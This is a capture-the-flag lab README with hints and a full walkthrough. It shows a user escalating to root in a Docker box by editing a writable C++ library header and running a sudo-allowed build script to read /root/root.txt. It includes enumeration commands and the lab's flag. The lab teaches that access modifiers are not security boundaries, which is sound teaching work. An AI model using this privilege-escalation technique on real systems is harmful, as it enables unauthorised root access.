# CTFs for Developers: Privacy Plz

## Objective: get the flag contained in `/root/root.txt`

**NOTE: If you want to play the CTF without hints, don't peek into the Dockerfile. Also try not to pay attention to the output of the `docker build` command otherwise you'll see the commands being executed.**


## How to build and run the environment

### From within the "CTFs-for-Developers/privacyplz" directory...

First build the image:
```console
$ docker build -t privacyplz -f privacyplz.Dockerfile .
```
Then create and attach to a container (that will be destroyed upon exit thanks to the `--rm` flag):
```console
$ docker run --rm -ti privacyplz
priv@83fbf6ad8938:/$
```

## Background information

### Installed libraries

Beyond some various dependencies installed from `apt` (you can always run a `apt list --installed` if you want to see exactly what), it also contains only one custom, pre-installed library, `privacyplz` found in `/opt/privacyplz`. You can view its source code in the environment in `/opt/privacyplz-src` or in this folder under the subfolder `privacyplz`.

You will also find in `/opt` the folder containing the files contained `privacy_h4ck3r`. Nothing of `privacy_h4ck3r` is installed or compiled.

### Working environment

When you attach to the box, you are the user `priv` and your objective is to get the flag found in `/root/root.txt`.


## Hints

<details>
<summary>Hint 1</summary>

This is a development CTF, so, given the context, a great place to start is looking into that pre-installed custom library, `privacyplz`. The next great thing to check out is the executable that wants to use the `privacyplz` library, `privacy_h4ck3r`. Both can be found in `/opt`. What are they trying to do and what stands in their way?


</details>

<details>
<summary>Hint 2</summary>

The user, `priv`, doesn't have write access to many files. What can the user change?

A `find / -writable 2>/dev/null` might help out.

</details>


</details>

<details>
<summary>Hint 3</summary>

`sudo` is installed. The command `sudo -l` will show you what the user can run as root.

</details>

## Solution Walkthrough

<details>
<summary>Show solution</summary>

## Setup

```console
user@machine privacyplz % docker build -t privacyplz -f privacyplz.Dockerfile .

..<SNIP>..

user@machine privacyplz % docker run --rm -ti privacyplz                       
priv@83fbf6ad8938:/$
```

Personally, I'll use VS Code dev containers (and open up `/opt`) since that makes life so much easier.

## Code Footprinting `/opt/privacyplz-src`

The library, `privacyplz`, doesn't have a readme or a developer guide, so the first place I'll look to see what it does is its tests. It only has two tests, both of which demonstrate how the library seems to be protecting a flag.

```c++
BOOST_AUTO_TEST_CASE(cannot_access_flag) {
    privacyplz::Account account;
    BOOST_CHECK(!account.canAccessFlag());
}

BOOST_AUTO_TEST_CASE(throws_exception_if_no_access) {
    privacyplz::Account account;
    auto check = [](const std::runtime_error& error){
        std::string message("Nope! No flag for you.");
        return message.find(error.what()) != std::string::npos;
    };
    BOOST_CHECK_EXCEPTION(account.getFlag(), std::runtime_error, check);
}
```

Since the build directory hasn't been removed, I can run the tests and see the library does in fact behave that way:

```console
priv@83fbf6ad8938:/$ /opt/privacyplz-src/build/privacyplz_test 
Running 2 test cases...

*** No errors detected
```

Looking at the Account header, it looks like yes, there are a couple of methods to see if the account has access to a flag and then to grab it if it does:

```c++
class Account {
public:
    Account();
    [[nodiscard]] std::string getFlag();
    [[nodiscard]] bool canAccessFlag();
private:
    Access access;
};
```

The account object can access the flag only when its `access` variable is set to `ALL`:

```c++
bool Account::canAccessFlag() {
    return access == Access::ALL;
}
```

And I can see in the `getFlag` method that it will only retrieve the flag from `/root/root/txt` if that check passes:

```c++
std::string Account::getFlag() {
        if (!canAccessFlag()) throw std::runtime_error("Nope! No flag for you.");
        std::filesystem::path roottxt("/root/root.txt");
        
        ..<SNIP>..

        return flag;
    }
```

Unfortunately, when an account is constructed, it sets the access to `NONE` and then it never changes it.

```c++
Account::Account() : access(Access::NONE){}
```

## Code Footprinting `/opt/privacy_h4ck3r`

The `privacy_h4ck3r` executable is extremely simple:

```c++
int main() {
    privacyplz::Account account;
    account.access = privacyplz::Access::ALL;
    std::cout << account.getFlag() << std::endl;
    return 0;
}
```

One can see immediately, however, that it'll never compile.

The directory also contains a build script, `build_and_run.sh`, that will build and run that executable. I'll try to run it just to make sure:

```console
priv@83fbf6ad8938:/$ /opt/privacy_h4ck3r/build_and_run.sh 
-- The C compiler identification is GNU 11.4.0
-- The CXX compiler identification is GNU 11.4.0
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Check for working C compiler: /usr/bin/cc - skipped
-- Detecting C compile features
-- Detecting C compile features - done
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Check for working CXX compiler: /usr/bin/c++ - skipped
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Configuring done
-- Generating done
-- Build files have been written to: /home/priv/privacy_h4ck3r_build
[ 50%] Building CXX object CMakeFiles/privacy_h4ck3r.dir/main.cpp.o
/opt/privacy_h4ck3r/main.cpp: In function 'int main()':
/opt/privacy_h4ck3r/main.cpp:7:13: error: 'privacyplz::Access privacyplz::Account::access' is private within this context
    7 |     account.access = privacyplz::Access::ALL;
      |             ^~~~~~
In file included from /opt/privacy_h4ck3r/main.cpp:1:
/opt/privacyplz/include/privacyplz/Account.hpp:15:16: note: declared private here
   15 |         Access access;
      |                ^~~~~~
gmake[2]: *** [CMakeFiles/privacy_h4ck3r.dir/build.make:76: CMakeFiles/privacy_h4ck3r.dir/main.cpp.o] Error 1
gmake[1]: *** [CMakeFiles/Makefile2:83: CMakeFiles/privacy_h4ck3r.dir/all] Error 2
gmake: *** [Makefile:91: all] Error 2
/opt/privacy_h4ck3r/build_and_run.sh: line 9: /home/priv/privacy_h4ck3r_build/privacy_h4ck3r: No such file or directory
priv@83fbf6ad8938:/$
```

Yep, the code doesn't compile. I would fix it but it looks like this user can't write anything in this directory.

```console
priv@83fbf6ad8938:/$ ll /opt/privacy_h4ck3r/
total 20
drwxr-xr-x 2 root root 4096 May  9 16:15 ./
drwxrwxr-x 1 root root 4096 May  9 16:15 ../
-rw-r--r-- 1 root root  230 May  9 14:56 CMakeLists.txt
-rwxr-xr-x 1 root root  285 May  9 16:15 build_and_run.sh*
-rw-r--r-- 1 root root  274 May  9 16:15 main.cpp
```
```console
priv@83fbf6ad8938:/$ echo "test" >> /opt/privacy_h4ck3r/build_and_run.sh 
bash: /opt/privacy_h4ck3r/build_and_run.sh: Permission denied
priv@83fbf6ad8938:/$ touch /opt/privacy_h4ck3r/test
touch: cannot touch '/opt/privacy_h4ck3r/test': Permission denied
priv@83fbf6ad8938:/$ echo "test" >> /opt/privacy_h4ck3r/main.cpp 
bash: /opt/privacy_h4ck3r/main.cpp: Permission denied
priv@83fbf6ad8938:/$
```

I guess it's time to move on.

## Host Footprinting

First I'll see what this `priv` user can do.

It doesn't have direct access to `/root/root.txt`

```console
priv@83fbf6ad8938:/$ cat /root/root.txt
cat: /root/root.txt: Permission denied
priv@83fbf6ad8938:/$ su
Password: 
su: Authentication failure
priv@83fbf6ad8938:/$
```

So I'll need the help of something on this box to get to that file. I'll see if the user has `sudo` privileges.

```console
priv@83fbf6ad8938:/$ sudo -l
Matching Defaults entries for priv on 83fbf6ad8938:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User priv may run the following commands on 83fbf6ad8938:
    (ALL) NOPASSWD: /opt/privacy_h4ck3r/build_and_run.sh
```

So I can run the `build_and_run.sh` script as root, but I already know that code doesn't compile. Running it as root won't help me at all. I need to be able to somehow fix the compilation problems. At this point, I'll see what files I actually do have write access to:

```console
priv@83fbf6ad8938:/$ find / -writable 2>/dev/null | grep -v /proc | grep -v /dev
/tmp
/opt/privacyplz/include
/opt/privacyplz/include/privacyplz
/opt/privacyplz/include/privacyplz/Account.hpp
/opt/privacyplz/include/privacyplz/Access.hpp
/home/priv
/home/priv/.profile
/home/priv/.bash_logout
/home/priv/.bashrc
/var/lock
/var/tmp
/run/lock
/etc/systemd/system/sudo.service
```

That's very odd that I have write access to the headers of an installed library. Also that looks about it. At this point I figure if the only thing I can modify is the headers, then why not give it a try.

To get the build_and_run.sh script to work, I need to get the code to compile. Its only problem was the accessibility... so I'll just open up `/opt/privacyplz/include/privacyplz/Account.hpp` in vim and delete the private modifier. Seems cheeky.

```console
#ifndef PRIVACYPLZ_ACCOUNT_HPP
#define PRIVACYPLZ_ACCOUNT_HPP

#include <string>
#include <memory>
#include "Access.hpp"

namespace privacyplz {
    class Account {
    public:
        Account();
        [[nodiscard]] std::string getFlag();
        [[nodiscard]] bool canAccessFlag();
        Access access;
    };
}

#endif

"/opt/privacyplz/include/privacyplz/Account.hpp" 18L, 325B written
```

I'll run the build_and_run.sh script as sudo and voilà!

```console
priv@83fbf6ad8938:/$ sudo /opt/privacy_h4ck3r/build_and_run.sh 
-- The C compiler identification is GNU 11.4.0
-- The CXX compiler identification is GNU 11.4.0
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Check for working C compiler: /usr/bin/cc - skipped
-- Detecting C compile features
-- Detecting C compile features - done
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Check for working CXX compiler: /usr/bin/c++ - skipped
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Configuring done
-- Generating done
-- Build files have been written to: /home/priv/privacy_h4ck3r_build
[ 50%] Building CXX object CMakeFiles/privacy_h4ck3r.dir/main.cpp.o
[100%] Linking CXX executable privacy_h4ck3r
[100%] Built target privacy_h4ck3r
devCTF{pr1vacy_m0dz_a1nt_c0mp1led}
priv@83fbf6ad8938:/$
```

There's the flag: devCTF{pr1vacy_m0dz_a1nt_c0mp1led}

Fun fact: accessibility modifiers are not enforced at the binary level. The binary contains symbols, and the headers give us an easy way to access those symbols. We probably shouldn't rely on visibility modifiers to ensure users use the library in the expected way.

</details>
